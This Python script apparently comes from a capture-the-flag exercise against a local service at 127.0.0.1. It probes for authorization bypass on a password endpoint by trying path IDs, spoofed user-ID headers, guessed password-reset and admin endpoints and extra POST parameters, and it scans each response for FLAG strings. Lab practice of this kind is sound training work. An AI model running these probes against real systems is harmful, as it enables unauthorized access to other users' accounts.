import requests
import re

BASE_URL = "http://127.0.0.1:32883"

print("[*] Exploring endpoint variations and parameter injection\n")

# Test 1: Try accessing /password/test with path parameters
print("[TEST 1] Path traversal and parameter injection\n")

test_urls = [
    "/password/test/1",
    "/password/test/10000",
    "/password/1",
    "/password/10000",
    "/test/1",
    "/test/10000",
]

for url in test_urls:
    try:
        resp = requests.get(BASE_URL + url, timeout=3)
        if resp.status_code != 404:
            print(f"{url}: Status {resp.status_code}, Length {len(resp.text)}B")
            
            # Check for FLAG or different content
            flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
            if flag_match:
                print(f"  [!] FLAG: {flag_match.group(0)}")
                print(f"  Full response:\n{resp.text}\n")
            elif resp.status_code == 200:
                print(f"  Snippet: {resp.text[:300]}\n")
    except:
        pass

print("="*60 + "\n")

# Test 2: Try header injection
print("[TEST 2] Header injection - X-User-ID, X-Forwarded-For, etc.\n")

headers_to_test = [
    {'X-User-ID': '10000'},
    {'X-User-Id': '1'},
    {'User-ID': '10000'},
    {'X-Original-User-ID': '1'},
]

for headers in headers_to_test:
    try:
        resp = requests.get(f"{BASE_URL}/password/test", headers=headers, timeout=3)
        
        # Check if response differs
        if len(resp.text) != 1418:
            print(f"Headers {headers}: Different response size {len(resp.text)}B")
            print(f"  Snippet: {resp.text[:300]}\n")
            
            flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
            if flag_match:
                print(f"  [!] FLAG: {flag_match.group(0)}\n")
    except:
        pass

print("="*60 + "\n")

# Test 3: Check if there's a /password/reset or similar endpoints
print("[TEST 3] Related password endpoints\n")

password_endpoints = [
    "/password",
    "/password/reset",
    "/password/change",
    "/password/forgot",
    "/password/recover",
    "/password/admin",
    "/password/verify",
    "/password/check",
    "/password/validate"
]

for endpoint in password_endpoints:
    try:
        resp = requests.get(BASE_URL + endpoint, timeout=3)
        if resp.status_code != 404:
            print(f"{endpoint}: Status {resp.status_code}, Length {len(resp.text)}B")
            
            flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
            if flag_match:
                print(f"  [!] FLAG: {flag_match.group(0)}")
                print(f"  Full response:\n{resp.text}\n")
            elif len(resp.text) < 1000:
                print(f"  Response: {resp.text}\n")
    except:
        pass

print("="*60 + "\n")

# Test 4: Try POST with additional/different parameters
print("[TEST 4] POST parameter variations\n")

param_tests = [
    {'username': 'test', 'password': 'test', 'id': '10000'},
    {'username': 'test', 'password': 'test', 'uid': '1'},
    {'username': 'test', 'password': 'test', 'user': '10000'},
]

for params in param_tests:
    try:
        resp = requests.post(f"{BASE_URL}/password/test", data=params, allow_redirects=True, timeout=3)
        
        print(f"Params {params}:")
        print(f"  Status: {resp.status_code}, URL: {resp.url}, Length: {len(resp.text)}B")
        
        if len(resp.text) != 1184:
            print(f"  [+] Different response!")
            print(f"  Snippet: {resp.text[:300]}\n")
            
            flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
            if flag_match:
                print(f"  [!] FLAG: {flag_match.group(0)}\n")
    except:
        pass

